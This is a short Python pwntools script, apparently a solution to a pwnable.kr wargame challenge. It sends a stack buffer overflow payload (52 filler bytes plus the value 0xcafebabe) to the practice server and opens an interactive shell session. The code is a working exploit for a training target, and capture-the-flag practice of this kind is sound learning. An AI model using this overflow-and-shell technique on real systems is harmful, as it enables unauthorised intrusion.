#!/usr/bin/env python

from pwn import *

s = remote('pwnable.kr',9000)
payload = 'a'*52 + '\xbe\xba\xfe\xca'
s.sendline(payload)
s.interactive()
